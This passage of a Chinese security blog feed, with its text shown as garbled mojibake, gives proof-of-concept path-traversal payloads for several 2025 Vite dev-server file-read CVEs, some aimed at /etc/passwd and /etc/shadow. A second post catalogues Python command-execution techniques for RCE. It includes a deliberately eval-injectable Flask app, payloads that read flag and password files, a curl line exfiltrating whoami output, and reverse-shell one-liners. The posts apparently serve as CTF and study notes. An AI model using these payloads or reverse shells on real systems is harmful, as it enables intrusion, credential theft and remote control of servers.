<p>è¿™è¾¹è´´pocï¼Œå›å¤´ä¼šè¡¥å¤ç°</p>
<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
/@fs/etc/passwd?raw??</code></pre>

<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-30208ï¼‰ | å°è‰¾åšå®¢</a></p>
<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>è¿™ä¸ªæ´æ˜¯åˆ©ç”¨inlineçš„è§„åˆ™é…åˆ.wsamè¿›è¡Œç»•è¿‡(æ˜¯å¯¹ä¸Šä¸€ä¸ªCVEçš„è¡¥ä¸çš„ç»•è¿‡)</p>
<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
è¿˜æœ‰ä¸¤ä¸ªä¸‹é¢é‚£ä¸ªå¤§ä½¬æ‰“å‡ºæ¥çš„æœªå…¬å¼€poc//é€‚ç”¨6.2.4
/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
/@fs/etc/shadow?meteorkai.svg?.wasm?init  //è¿™é‡Œæ²¡æœ‰importæ˜¯å› ä¸ºè¯»å–çš„æ–‡ä»¶æ²¡æœ‰åç¼€ï¼ŒisJSRequestä¸ºtrue</code></pre>

<p>è¿™è¾¹å¼•ç”¨ä¸€ä¸‹å¤§ä½¬çš„è§£é‡Šå¥½äº†</p>
<pre><code class="highlight plaintext">é™¤äº†?urlå’Œ?rawè¿˜æœ‰ä¸€ç§å†…è”çš„æ–¹æ³•?inlineï¼Œä»–çš„ä½œç”¨æ˜¯ï¼š
å°†æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ã€å­—ä½“ã€WASM ç­‰ï¼‰çš„å†…å®¹è½¬æ¢ä¸º Base64 ç¼–ç å­—ç¬¦ä¸² æˆ– ç›´æ¥åµŒå…¥åˆ° JS/HTML/CSS ä¸­ï¼Œé¿å…é¢å¤–çš„ HTTP è¯·æ±‚
?initä¸»è¦ç”¨äº WebAssemblyï¼ˆ.wasmï¼‰æ–‡ä»¶çš„åˆå§‹åŒ–ï¼Œé»˜è®¤åªæœ‰.wasmæ”¯æŒ?initå…¶ä»–å¦‚.dataã€.binå¯ä»¥é€šè¿‡æ’ä»¶æ‹“å±•æ”¯æŒ
é€šè¿‡è¿™ç§æ–°çš„æ–¹æ³•ç»•è¿‡äº†ä¿®å¤åçš„æ­£åˆ™è¿‡æ»¤
//åŸé“¾æ¥https://cloud.tencent.com/developer/article/2513407</code></pre>

<p><a href="https://xz.aliyun.com/news/17655">Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-31125ï¼‰-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>å…ˆè´´å‡ºpoc</p>
<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>

<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">åŸé“¾</a></p>
<p>å…¶ä¸­ç¬¬äºŒä¸ªpocæ˜¯éœ€è¦å…ˆæ¢å‡ºå¤§æ¦‚çš„è·¯å¾„æ‰èƒ½æ‰“çš„</p>
<p><a href="https://xz.aliyun.com/news/17730">Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-31486ï¼‰-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>

<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">åŸé“¾</a></p>
<p><a href="https://xz.aliyun.com/news/17745">Viteä»»æ„æ–‡ä»¶è¯»å–bypassè°ƒè¯•åˆ†æï¼ˆCVE-2025-32395ï¼‰-å…ˆçŸ¥ç¤¾åŒº</a></p>
]]></content>
      <tags>
        <tag>-CVE -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonçš„RCEå§¿åŠ¿ä»¥åŠå†…å­˜é©¬æ³¨å…¥</title>
    <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="pythonçš„rceå§¿åŠ¿ä»¥åŠå†…å­˜é©¬æ³¨å…¥-æœªè¡¥å®Œ"><a href="#pythonçš„rceå§¿åŠ¿ä»¥åŠå†…å­˜é©¬æ³¨å…¥-æœªè¡¥å®Œ" class="headerlink" title="pythonçš„rceå§¿åŠ¿ä»¥åŠå†…å­˜é©¬æ³¨å…¥(æœªè¡¥å®Œ)"></a>pythonçš„rceå§¿åŠ¿ä»¥åŠå†…å­˜é©¬æ³¨å…¥(æœªè¡¥å®Œ)</h1><p>pythonçš„SSTIæ˜¯æ˜ç™½çš„ï¼Œå¯æ˜¯å¦‚æœæ˜¯å…ˆæ¸²æŸ“å†æ¥å—å‚æ•°å‘¢?åªä¼ å‚ä¸æ¸²æŸ“åˆè¯¥å¦‚ä½•é¢å¯¹å‘¢</p>
<p>è¯¶ï¼Œæ³¨å…¥ä¸€ä¸ªå†…å­˜é©¬è¯•è¯•.?</p>
<h2 id="Python-çš„å‘½ä»¤æ‰§è¡Œ"><a href="#Python-çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Python çš„å‘½ä»¤æ‰§è¡Œ"></a>Python çš„å‘½ä»¤æ‰§è¡Œ</h2><p>ä¸åŒäºphpè‡ªå¸¦çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œpythonæ˜¯è¦å…ˆå¼•å…¥æ¨¡å—çš„ï¼Œå‚è€ƒjinja2æ¨¡æ¿æ³¨å…¥æ‰¾oså†…ç½®å‡½æ•°çš„é‚£ä¸ªè¿‡ç¨‹</p>
<h3 id="OSæ¨¡å—"><a href="#OSæ¨¡å—" class="headerlink" title="OSæ¨¡å—"></a>OSæ¨¡å—</h3><p>ç»å…¸æ¬¾:</p>
<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,ä½†æ˜¯æ— æ³•å°†ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç»“æœè¿”å›.å¦‚æœæ‰§è¡ŒæˆåŠŸäº†ä¼šè¿”å›0,å¤±è´¥äº†ä¼šè¿”å›1</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;dir&#x27;</span>)  //è¾“å‡ºç›®å½•ç»“æ„
<span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //è¾“å‡ºç›®å½•ç»“æ„,ä¸‹ä¸€è¡Œè¾“å‡º<span class="number">0</span></code></pre>

<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen:"></a><code>os.popen</code>:</h4><p>å¯ä»¥ç”¨æ¥å°†ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç»“æ„å­˜å‚¨åˆ°ä¸€ä¸ªç®¡é“æ–‡ä»¶ä¸­(ä»€ä¹ˆæ˜¯ç®¡é“æ–‡ä»¶?ä¸ªäººç†è§£æ˜¯ç±»ä¼¼phpä¸­çš„pharè¿™ç§).ç„¶åå¯ä»¥é€šè¿‡readæ–¹æ³•æ¥å°†ç®¡é“æ–‡ä»¶çš„å†…å®¹è¿”å›</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
out=os.popen(<span class="string">&#x27;dir&#x27;</span>)
<span class="built_in">print</span>(out.read())</code></pre>

<h3 id="subprocessæ¨¡å—"><a href="#subprocessæ¨¡å—" class="headerlink" title="subprocessæ¨¡å—"></a>subprocessæ¨¡å—</h3><p>å¯ä»¥è®¤ä¸ºsubprocessæ˜¯osæ¨¡å—çš„å®‰å…¨ç‰ˆ</p>
<h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>åŸºæœ¬æ˜¯subprocessä¸­æœ€å¸¸ç”¨çš„æ¨¡å—,åŒ…å«ä¸‹åˆ—å‚æ•°</p>
<pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre>

<hr>
<pre><code class="highlight plaintext">1.å”¯ä¸€ä¸€ä¸ªå¿…é¡»è¦æœ‰çš„å‚æ•°,ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨/å­—ç¬¦ä¸²,å…¶ä¸­ç¬¬ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åº,åé¢çš„åˆ™æ˜¯ä¼ é€’çš„å‚æ•°</code></pre>

<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
<span class="built_in">print</span>(out.stdout)</code></pre>

<p>è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„å¼¹è®¡ç®—å™¨å‘½ä»¤,ä½†æ˜¯éœ€è¦æ³¨æ„,ç”±äºwindowså¹¶ä¸æ˜¯åƒlinuxé‚£æ ·ç”±çº¯æ–‡ä»¶ç»„æˆ,æ‰€ä»¥è¿™é‡Œçš„åˆ—è¡¨ä¸­æ— æ³•ç›´æ¥ä½¿ç”¨dirå‘½ä»¤å¦‚<code>[&quot;dir&quot;]</code>(æœ¬è´¨ä¸Šè¿™ä¸ªdiræ˜¯ä¼ é€’ç»™windows.cmdçš„ä¸€ä¸ªå‚æ•°,ä½†æ˜¯è¿™ä¸ªwindows.cmdç¨‹åºçš„ä½ç½®æ‰¾ä¸åˆ°)</p>
<hr>
<pre><code class="highlight plaintext">2.shell=True,é»˜è®¤ä¸ºfalse</code></pre>

<p>ç”¨äºæ§åˆ¶æ˜¯å¦å…è®¸åœ¨ç¬¬ä¸€ä¸ªå‚æ•°å¤„ç›´æ¥ä½¿ç”¨shellå‘½ä»¤çš„,å¼€å¯ååˆ™å¯ä»¥ä¸ä½¿åˆ—è¡¨è€Œæ˜¯ä»¥å­—ç¬¦ä¸²å½¢å¼ç›´æ¥ä½¿ç”¨,å¦‚:</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
<span class="built_in">print</span>(out.stdout)</code></pre>

<p>å¤ç°æ•ˆæœï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p>
<hr>
<pre><code class="highlight plaintext">3.stdin,stdout,stderr,é»˜è®¤ä¸ºfalse</code></pre>

<p>è¿™ä¸‰ä¸ªå‚æ•°ç”¨æ¥è®¾ç½®è¾“å…¥,è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯ä¸ºç®¡é“å¯¹è±¡æˆ–æ˜¯ç±»æ–‡ä»¶å¯¹è±¡,è¿™é‡Œä¸å¸¸ç”¨.</p>
<hr>
<pre><code class="highlight plaintext">4.capture_output=true,é»˜è®¤ä¸ºfalse</code></pre>

<p>ç”¨äºæ•è·stdoutå’Œstderræ—¶æœŸä¸ä¼šè¾“å‡ºåˆ°ç»ˆç«¯è€Œæ˜¯ä½œä¸ºä¸€ä¸ªå¯¹è±¡æ¥è¿”å›.</p>
<hr>
<pre><code class="highlight plaintext">5.text=true,é»˜è®¤ä¸ºfalse</code></pre>

<p>é»˜è®¤çŠ¶æ€ä¸‹è¿”å›çš„æ•°æ®ä¸ºå­—èŠ‚æµ,è€Œ<code>text=true</code>å¯ä»¥ä½¿å¾—è¿”å›çš„æ•°æ®ä¸ºå­—ç¬¦ä¸²è€Œä¸æ˜¯å­—èŠ‚æµ,ä¸ç”¨äººæ‰‹åŠ¨è½¬æ¢.</p>
<hr>
<pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre>

<p>å¦‚æœæŒ‡å®šäº†å‚æ•°,åˆ™stdin,stdout,stderrå¯ä»¥æ¥å—è¯¥ç±»å‹çš„æ•°æ®,å¦åˆ™é»˜è®¤ä¸ºå­—èŠ‚æµ.å¯ä»¥è®¤ä¸ºæ˜¯<code>text=true</code>çš„ä¸€ä¸ªæ‰‹åŠ¨é€‰æ‹©ç‰ˆ</p>
<hr>
<pre><code class="highlight plaintext">7.timeout</code></pre>

<p>è®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´.å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶,å­è¿›ç¨‹å°†è¢«æ€æ­»,å¹¶å¼¹å‡º <code>TimeoutExpired</code>å¼‚å¸¸.</p>
<hr>
<pre><code class="highlight plaintext">8.check=true</code></pre>

<p>å¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º<code>True</code>,å¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯0,åˆ™å¼¹å‡º<code>CalledProcessError</code>å¼‚å¸¸.</p>
<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>æ˜¯subprocessæ–¹æ³•çš„æ ¸å¿ƒ,å¯ç”¨äºå®ç°æ›´ä¸ºå¤æ‚çš„åŠŸèƒ½</p>
<p>å…·ä½“ä»‹ç»å°±ä¸ç»™äº†ï¼Œç»™ä¸¤ä¸ªå¤§ä½¬çš„åšå®¢è‡ªå·±é€‰æ‹©ç€çœ‹çœ‹æŠŠ(</p>
<p><a href="https://www.cnblogs.com/-qing-/p/10934322.html">Pythonä¹‹subprocessæ¨¡å— - å¿å…ˆç”Ÿ - åšå®¢å›­</a></p>
<p><a href="https://www.cnblogs.com/yifengyu/p/16115712.html">pythonä¸­çš„subprocess.Popen()ã€PIPEä½¿ç”¨è¯¦è§£ - å¹³è¡Œæ—¶ç©ºçš„æ—…è€… - åšå®¢å›­</a></p>
<p>ç›´æ¥å¼€å§‹æœ¬åœ°å¤ç°</p>
<pre><code class="highlight plaintext">import  subprocess
p = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre>

<p>åœ¨linuxæˆåŠŸå¤ç°</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p>
<p>åè§‚windows(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png" alt="image-20250325191725159"></p>
<p>ä¿®äº†ä¸€ä¸‹ï¼Œæ˜¯ç¼–ç é—®é¢˜+ä¸€ä¸ªstdoutå’Œstderræœªé‡å®šå‘åˆ°PIPEçš„é—®é¢˜</p>
<p>ä¿®äº†ä¸€ä¸‹æˆåŠŸè¯»å–</p>
<pre><code class="highlight python"><span class="keyword">import</span>  subprocess
p = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=<span class="string">&quot;gbk&quot;</span>)

stdout, stderr = p.communicate()

<span class="built_in">print</span>(stdout)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p>
<p>ä¸€èˆ¬pocé•¿è¿™ä¸ªæ ·å­</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
a=subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()
<span class="built_in">print</span>(a)</code></pre>



<h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>æ¥æ”¶å­—ç¬¦ä¸²æ ¼å¼çš„å‘½ä»¤ï¼Œæ‰§è¡Œå‘½ä»¤å¹¶è¿”å›æ‰§è¡Œç»“æœï¼Œå…¶åŠŸèƒ½ç±»ä¼¼äºos.popen(cmd).read()å’Œcommands.getoutput(cmd)ã€‚</p>
<p>ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å¹¶å°†stdoutå’Œstderrç›´æ¥æ•è·(ä¸è¾“å‡ºåˆ°ç»ˆç«¯)å¹¶ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> subprocess
out=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># åˆ°è¿™è¿˜æ²¡æœ‰è¾“å‡º</span>
<span class="built_in">print</span>(out) <span class="comment">#åˆ°è¿™æ‰æœ‰çš„è¾“å‡º</span></code></pre>

<h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>å¯ä»¥ç†è§£ä¸º<code>subprocess.run</code>å’Œ<code>subprocess.getoutput</code>çš„ç»“åˆç‰ˆ.ä¼šå°†stdoutæ•è·ä½œä¸ºå­—ç¬¦ä¸²è¿”å›,åŒæ—¶ä¹Ÿå¯ä»¥åƒ<code>subprocess.run</code>ä¸€æ ·ä½¿ç”¨è¾ƒä¸ºå¤æ‚çš„è‡ªå®šä¹‰åŠŸèƒ½.</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># åˆ°è¿™è¿˜æ²¡æœ‰è¾“å‡º</span>
<span class="built_in">print</span>(out) <span class="comment">#åˆ°è¿™æ‰æœ‰çš„è¾“å‡º</span></code></pre>

<h4 id="subprocess-call-åŠcheck-call"><a href="#subprocess-call-åŠcheck-call" class="headerlink" title="subprocess.call() åŠcheck_call()"></a><code>subprocess.call() </code>åŠ<code>check_call()</code></h4><p><code>subprocess.call() </code>ä¸ºpython3.5ä»¥å‰ç‰ˆæœ¬ä½¿ç”¨,ä¸<code>subprocess.run()</code>ç”¨æ³•åŸºæœ¬ä¸€è‡´,ä½†call()è¿”å›çš„ä¸ºå‘½ä»¤ç»“æŸç ,æ— æ³•è·å–æ›´å¤šä¿¡æ¯,ä¸æ¨èä½¿ç”¨,ç°å·²è¢«run()å–ä»£.<br><code>subprocess.check_call() </code>ä¸<code>call()</code>çš„åŒºåˆ«ä¸º,<code>check_call()</code>å¦‚æœå‘½ä»¤å¤±è´¥(å³ returncodeä¸ä¸º0)ä¼šä¸»åŠ¨æŠ›å‡º<code>subprocess.CalledProcessError</code>å¼‚å¸¸,ä½¿ç”¨<code>subprocess.run(check=True)</code>å¯å–ä»£<code>subprocess.check_call()</code>.</p>
<h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>æ˜¯ç±»ä¼¼äº<code>render_template</code>å’Œ<code>redirect</code>çš„ä¸€ç§ç”¨äºå‰åç«¯äº¤äº’çš„æ–¹æ³•,å¯ä»¥ä¸‹è½½æŒ‡å®šçš„æ–‡ä»¶.</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> subprocess
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Response
app = Flask(__name__)
<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)
<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>

<h3 id="evalå’Œexec"><a href="#evalå’Œexec" class="headerlink" title="evalå’Œexec"></a>evalå’Œexec</h3><p>eval()å’Œ exec()å‡½æ•°çš„åŠŸèƒ½æ˜¯ç›¸ä¼¼çš„,éƒ½å¯ä»¥æ‰§è¡Œä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ Pythonä»£ç (ä»£ç ä»¥å­—ç¬¦ä¸²çš„å½¢å¼æä¾›),ç›¸å½“äºä¸€ä¸ªPythonçš„è§£é‡Šå™¨.äºŒè€…ä¸åŒä¹‹å¤„åœ¨äº,eval()æ‰§è¡Œå®Œè¦è¿”å›ç»“æœ,è€Œexec()æ‰§è¡Œå®Œä¸è¿”å›ç»“æœ.</p>
<pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
app = Flask(__name__)
<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&quot;cmd&quot;</span>):
        <span class="keyword">return</span> send_file(<span class="string">&quot;app.py&quot;</span>)
    <span class="keyword">else</span>:
        cmd=request.args.get(<span class="string">&quot;cmd&quot;</span>)
        res=<span class="built_in">eval</span>(cmd)
        <span class="keyword">return</span> res
<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>

<p>payload:</p>
<pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,
capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).stdout
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;cat /flag&quot;</span>,
shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)
?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre>

<p>è¿™é‡Œé¢çš„<code>__import__(&quot;os&quot;)</code>ä¸€ç±»çš„ç”¨æ³•æ˜¯ç”¨äºåŠ¨æ€å¯¼å…¥æ¨¡å—çš„.</p>
<h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3><pre><code class="highlight plaintext">import commands
commands.getstatusoutput(&quot;ls&quot;)
commands.getoutput(&quot;ls&quot;)
commands.getstatus(&quot;ls&quot;)</code></pre>

<h3 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h3><pre><code class="highlight plaintext">import ctypes
ctypes.CDLL(None).system(&#x27;ls /&#x27;.encode())</code></pre>

<h3 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h3><pre><code class="highlight plaintext">import threading
import os

def func():
    os.system(&#x27;ls&#x27;)  # åœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œå‘½ä»¤

t = threading.Thread(target=func)  # åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹
t.start()  # å¼€å§‹æ‰§è¡Œæ–°çš„çº¿ç¨‹

__import__(&#x27;threading&#x27;).Thread(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)).start()</code></pre>

<h4 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h4><pre><code class="highlight plaintext">import multiprocessing
multiprocessing.Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>

<h4 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a><code>_posixsubprocess</code></h4><pre><code class="highlight plaintext">import os
import _posixsubprocess

_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)</code></pre>

<h4 id="pty"><a href="#pty" class="headerlink" title="pty"></a>pty</h4><pre><code class="highlight plaintext">import pty
pty.spawn(&quot;ls&quot;)</code></pre>

<h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h4><pre><code class="highlight plaintext">import timeit
timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)</code></pre>

<h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><pre><code class="highlight plaintext">import platform
print platform.popen(&#x27;dir&#x27;).read()</code></pre>

<h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h4><pre><code class="highlight plaintext">import importlib
importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)
# Python3å¯ä»¥ï¼ŒPython2æ²¡æœ‰è¯¥å‡½æ•°
importlib.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</code></pre>

<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><pre><code class="highlight plaintext">import sys
sys.modules[&#x27;os&#x27;].system(&#x27;calc&#x27;)</code></pre>

<h4 id="linecache"><a href="#linecache" class="headerlink" title="linecache"></a>linecache</h4><pre><code class="highlight plaintext">import linecache
linecache.os.system(&#x27;ls&#x27;)</code></pre>

<h4 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h4><pre><code class="highlight plaintext">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;)

eval(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;)

execfile(&#x27;exp.py&#x27;)
# py2 
execfile(&quot;E:\Python27\Lib\os.py&quot;)
system(&#x27;calc&#x27;)

exec(compile(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;))</code></pre>

<h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><pre><code class="highlight plaintext">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)

s=__import__(&#x27;socket&#x27;).socket(__import__(&#x27;socket&#x27;).AF_INET,__import__(&#x27;socket&#x27;).SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));[__import__(&#x27;os&#x27;).dup2(s.fileno(),i) for i in range(3)];__import__(&#x27;pty&#x27;).spawn(&quot;/bin/sh&quot;)</code></pre>

<p>å…¶ä»–</p>
<pre><code class="highlight plaintext">bdbï¼šbdb.osã€cgi.sys
cgiï¼šcgi.osã€cgi.sys</code></pre>

<h2 id="Flask-RCEåˆ©ç”¨-å†…å­˜é©¬ç¯‡"><a href="#Flask-RCEåˆ©ç”¨-å†…å­˜é©¬ç¯‡" class="headerlink" title="Flask RCEåˆ©ç”¨(å†…å­˜é©¬ç¯‡)"></a>Flask RCEåˆ©ç”¨(å†…å­˜é©¬ç¯‡)</h2><p>çœ‹è¿‡äº†pythonï¼Œä½†æ˜¯flaskå’Œpythonåˆä¸æ˜¯åŒä¸€å›äº‹æƒ…ï¼Œå› ä¸ºflaskä¸‹æœ‰å¾ˆå¤šå¯ä¾›è°ƒç”¨çš„å‡½æ•°ï¼Œåªèƒ½å¯ä»¥å‚è€ƒä¸€ç‚¹pythonçš„,ä½†å¤§å¤šæ•°æ—¶å€™æ˜¯flaskä¸‹ç‰¹æœ‰çš„å‡½æ•°æ‰“çš„æœ‰é—®é¢˜(</p>
